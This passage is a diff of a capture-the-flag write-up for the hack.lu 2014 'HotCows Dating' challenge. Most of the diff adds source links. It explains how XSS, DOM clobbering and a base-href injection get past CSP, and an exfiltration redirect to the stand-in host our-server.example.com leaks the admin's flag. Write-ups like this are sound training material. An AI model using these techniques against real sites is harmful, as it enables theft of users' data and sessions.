@@ -65,9 +65,9 @@ drwxr-xr-x   7 mathias  staff   238 Oct 22 17:03 static
 drwxr-xr-x  10 mathias  staff   340 Oct 22 17:03 templates
 ```
 
-Now we have access to the full source code for the site.
+Now we have access to [the full source code for the site](https://github.com/ctfs/write-ups/tree/master/hack-lu-ctf-2014/hotcows-dating/source).
 
-Studying the code reveals that the flag is messaged to premium account users when they start a new chat session. See the `page.firstMessage` function in `js/pages/chat.js`. Since there’s no way for us to get a premium account, we’ll have to find a way to have a premium user do this for us, and then leak the flag somehow.
+Studying the code reveals that the flag is messaged to premium account users when they start a new chat session. See [the `page.firstMessage` function in `js/pages/chat.js`](https://github.com/ctfs/write-ups/blob/master/hack-lu-ctf-2014/hotcows-dating/source/js/pages/chat.js#L200-L218). Since there’s no way for us to get a premium account, we’ll have to find a way to have a premium user do this for us, and then leak the flag somehow.
 
 We guessed that the ‘report a problem’ functionality would cause a logged-in site administrator to visit the profile for the cow whose name you enter. What if we can get a cross-site scripting (XSS) vector in there?
 
@@ -97,7 +97,7 @@ After URL-decoding, that becomes:
 
 The flag is `flag{cows_need_love_too}`. But why on earth did this work?!
 
-The `page.view` function around line 134 of `js/pages/chat.js` contains this snippet:
+[The `page.view` function around line 134 of `js/pages/chat.js`](https://github.com/ctfs/write-ups/blob/master/hack-lu-ctf-2014/hotcows-dating/source/js/pages/chat.js#L131-L198) contains this snippet:
 
 ```js
 cow_name = location.hash.slice(1);
@@ -107,9 +107,9 @@ temp_main.assign(cow_name, 'cow');
 temp_main.render();
 ```
 
-`location.hash.slice(1)` is the part of the URL following `#`, which is under our control. Since this value is never sanitized, this creates an XSS vulnerability. However, the site is sending a CSP header which disallows inline scripts:
+`location.hash.slice(1)` is the part of the URL following `#`, which is under our control. Since this value is never sanitized, this creates an XSS vulnerability. However, [the site is sending a CSP header which disallows inline scripts](https://github.com/ctfs/write-ups/blob/master/hack-lu-ctf-2014/hotcows-dating/source/cfg.php#L40):
 
-```http
+```
 Content-Security-Policy: default-src 'none'; img-src 'self'; script-src 'self'; style-src 'self'; connect-src 'self'
 ```
 
@@ -125,20 +125,20 @@ Since the error is not caught using `catch`, the rest of the code in `page.view`
 temp = new Template('message.html');
 ```
 
-As a result, the global `temp` variable maintains its previous value, which is a reference to the built-in `location` object because of this line in `js/router.js`:
+As a result, the global `temp` variable maintains its previous value, which is a reference to the built-in `location` object because of [this line in `js/router.js`](https://github.com/ctfs/write-ups/blob/master/hack-lu-ctf-2014/hotcows-dating/source/js/router.js#L8-L9):
 
 ```js
 router.route((m = /p=(\w+)/.exec(temp=location)) ? m[1] : 'index',
        (!!temp.hash) ? temp.hash.slice(1) : undefined);
 ```
 
-When the page was loaded, `js/pages/chat.js` set up a timer to call `page.firstMessage` after a second:
+When the page was loaded, [`js/pages/chat.js` set up a timer to call `page.firstMessage` after a second](https://github.com/ctfs/write-ups/blob/master/hack-lu-ctf-2014/hotcows-dating/source/js/pages/chat.js#L224):
 
 ```js
 setTimeout(page.firstMessage, 1000);
 ```
 
-The `page.firstMessage` function looks like this:
+[The `page.firstMessage` function](https://github.com/ctfs/write-ups/blob/master/hack-lu-ctf-2014/hotcows-dating/source/js/pages/chat.js#L200-L218) looks like this:
 
 ```js
 /**
@@ -162,9 +162,9 @@ page.firstMessage = function firstMessage() {
 };
 ```
 
-`temp.assign` is supposed to refer to the custom `Template.prototype.assign` method as defined in `js/template.js`, but because `temp` is now a reference to `location`, it’s actually [`location.assign`](https://html.spec.whatwg.org/multipage/browsers.html#dom-location-assign).
+`temp.assign` is supposed to refer to [the custom `Template.prototype.assign` method as defined in `js/template.js`](https://github.com/ctfs/write-ups/blob/master/hack-lu-ctf-2014/hotcows-dating/source/js/template.js#L9-L14), but because `temp` is now a reference to `location`, it’s actually [`location.assign`](https://html.spec.whatwg.org/multipage/browsers.html#dom-location-assign).
 
-Note that thanks to our DOM clobbering attack, the call to `page.appendMessage` throws an exception, since it attempts to use `document.getElementById`. As a result, the rest of the code in `page.firstMessage` is never executed. This leaves the following code:
+Note that thanks to our DOM clobbering attack, the call to [`page.appendMessage`](https://github.com/ctfs/write-ups/blob/382aa45be715459a132d44d160358845110e0e73/hack-lu-ctf-2014/hotcows-dating/source/js/pages/chat.js#L104-L111) throws an exception, since it attempts to use `document.getElementById`. As a result, the rest of the code in `page.firstMessage` is never executed. This leaves the following code:
 
 ```js
 temp.assign('system', 'class');
@@ -208,11 +208,11 @@ Another way to solve the challenge was to use a subtle form of a [dangling marku
 
 The challenge author confirmed on IRC that this is not the intended solution, although it is a very nice bypass. This exploit works because it uses a chain of lucky events:
 
-1. When instantiating a new `Template` object, the template is immediately loaded via `XMLHttpRequest` and cached in the `sessionStorage`.
-2. Since the injection (lines 144 and 145 in `js/pages/chat.js`) already occurs before the load of the `message.html` template (line 165), the new base URL is in effect.
-3. The page uses a relative URL to load the `message.html` template, so it is hijacked by the base URL and blocked by CSP. The `XMLHttpRequest` fails with a `SecurityError`. Thus the `temp` variable is not set and remains to be the `location` object.
-4. In `page.appendMessage` the `renderToString` function cannot be found on the `location` object and errors.
-5. So this leaves a call to `location.assign('<base href=https://our-server.example.com/> (PREM_flag{cows_need_love_too!})')`. This is in fact a relative URL and hence hijacked by the new base URI.
+1. When [instantiating a new `Template` object](https://github.com/ctfs/write-ups/blob/master/hack-lu-ctf-2014/hotcows-dating/source/js/template.js#L1-L7), the template is [immediately loaded via `XMLHttpRequest` and cached in the `sessionStorage`](https://github.com/ctfs/write-ups/blob/master/hack-lu-ctf-2014/hotcows-dating/source/js/loader.js#L32-L42).
+2. Since the injection ([lines 144 and 145 in `js/pages/chat.js`](https://github.com/ctfs/write-ups/blob/master/hack-lu-ctf-2014/hotcows-dating/source/js/pages/chat.js#L144)) already occurs before the load of the `message.html` template ([line 165](https://github.com/ctfs/write-ups/blob/master/hack-lu-ctf-2014/hotcows-dating/source/js/pages/chat.js#L144)), the new base URL is in effect.
+3. The page [uses a relative URL to load the `message.html` template](https://github.com/ctfs/write-ups/blob/master/hack-lu-ctf-2014/hotcows-dating/source/js/pages/chat.js#L165), so it is hijacked by the base URL and blocked by CSP. The `XMLHttpRequest` fails with a `SecurityError`. Thus the `temp` variable is not set and remains to be the `location` object.
+4. In [`page.appendMessage`](https://github.com/ctfs/write-ups/blob/master/hack-lu-ctf-2014/hotcows-dating/source/js/pages/chat.js#L104-L111) the `renderToString` function cannot be found on the `location` object and errors.
+5. So this leaves a call to [`location.assign('<base href=https://our-server.example.com/> (PREM_flag{cows_need_love_too!})')`](https://github.com/ctfs/write-ups/blob/master/hack-lu-ctf-2014/hotcows-dating/source/js/pages/chat.js#L179). This is in fact a relative URL and hence hijacked by the new base URL.
 6. Finally the browser redirects to `https://our-server.example.com/<base href=https://our-server.example.com/> (PREM_flag{cows_need_love_too!})`.
 
 In a way, this exploit is even harder to find than the intended solution. Every attacker surfing on `chat.js` fills the `sessionStorage` with the legitimate `message.html` `Template`. This stops the exploit from working because it needs the first `SecurityError` due to the `XMLHttpRequest`.
